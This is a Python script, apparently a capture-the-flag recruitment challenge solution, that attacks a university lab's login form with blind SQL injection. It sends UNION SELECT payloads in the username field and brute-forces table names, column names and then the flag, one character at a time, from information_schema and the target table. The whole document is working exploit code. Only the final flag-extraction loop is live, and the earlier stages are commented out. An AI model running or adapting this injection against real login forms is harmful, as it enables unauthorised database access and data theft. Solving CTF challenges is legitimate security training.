import requests


url = 'http://recruit.osiris.cyber.nyu.edu:2002/auth/login'

headers = {'Host': 'recruit.osiris.cyber.nyu.edu:2002',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0',
            'Referer': 'http://recruit.osiris.cyber.nyu.edu:2002/auth/login',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'CHALBROKER_USER_ID=jd3846',
            }

"""
table = 'its_in_here'
column = 'flag'
brute ='f'
length=1
# ' UNION SELECT flag FROM its_in_here WHERE SUBSTRING(flag, 1,1)='f'; -- asdf
payload = {"username": "' UNION SELECT "+column+" FROM "+table+" WHERE "+column+" LIKE '"+brute+"' COLLATE utf8_bin; -- asdf", "password": "' -- asdf"}
r = requests.post(url, headers = headers, data=payload)
print(r.status_code, r.reason)
print(r.content)

#SELECT email, SUBSTRING(email, 1, 3) FROM users WHERE SUBSTRING(email,1,3)='jam'

if r.content.find('ve gone too far, re-read') != -1:
    print("success")

"""


#BRUTES TABLE NAME
"""
tables = []
superActive = True
start = 105
while superActive:
    brute = ''
    length = 0
    active = True
    i = start #126 max
    while active:
        if i == 127:
            active = False

        payload = {"username": "' UNION SELECT table_name FROM information_schema.tables WHERE SUBSTRING(table_name,1,"+str(length)+")='"+brute+"'; -- asdf", "password": "' -- asdf"}
        r = requests.post(url, headers = headers, data=payload)
        print(r.status_code, r.reason)

        if r.content.find('ve gone too far, re-read') != -1:
            print(r.content)
            print("success")
            print("table name:", brute)
            if len(brute) == 0:
                i = start
            else:
                i = 33
            brute += chr(i)
            length += 1
        else:
            print('na fam')
            print('attempt:', brute)
            brute = brute[:-1]
            i += 1
            if i != 127:
                brute += chr(i)
    tables.append(brute)
    start=ord(brute[0])+1
    if start == 127:
        superActive= False

print(tables)
"""


"""
#BRUTES column name
brute = ''
table = 'its_in_here'
active = True
i = 33 #126 max
while active:
    if i == 126:
        active = False

    payload = {"email": "' UNION SELECT column_name from information_schema.columns WHERE table_name = '"+table+"' AND column_name LIKE '"+brute+"%'; -- asdf", "password": "' -- asdf"}
    r = requests.post(url, headers = headers, data=payload)
    print(r.status_code, r.reason)

    if r.content.find('ve gone too far, re-read') != -1:
        print(r.content)
        print("success")
        print("item:", brute)
        i = 33
        brute += chr(i)
    else:
        print('na fam')
        print('attempt:', brute)
        brute = brute[:-1]
        i += 1
        if i == 37:
            i = 38
        if i == 73 and len(brute) == 0:
            i += 1
        if i != 127:
            brute += chr(i)

print("DONE:", brute)
"""
#BRUTES flag
brute = 'f'
table='its_in_here'
column='flag'
length = 1
offset = 0
active = True
i = 33 #126 max
while active:
    if i == 126:
        active = False

    payload = {"username": "' UNION SELECT "+column+" FROM "+table+" WHERE ASCII(SUBSTRING("+column+", "+str(offset+1)+","+str(length)+"))="+hex(ord(brute[offset]))+"; -- asdf", "password": "' -- asdf"}
    #payload = {"username": "' UNION SELECT "+column+" FROM "+table+" WHERE SUBSTRING("+column+", 1,"+str(length)+")='"+brute+"'; -- asdf", "password": "' -- asdf"
    r = requests.post(url, headers = headers, data=payload)
    print(r.status_code, r.reason)

    if r.content.find('ve gone too far, re-read') != -1:
        print(r.content)
        print("success")
        print("item:", brute)
        print(hex(ord(brute[offset])))
        i = 33
        length += 1
        offset += 1
        brute += chr(i)
    else:
        print('na fam')
        print('attempt:', brute)
        brute = brute[:-1]
        i += 1
        if i == 37:
            i = 38
        brute += chr(i)

print("DONE:", brute)
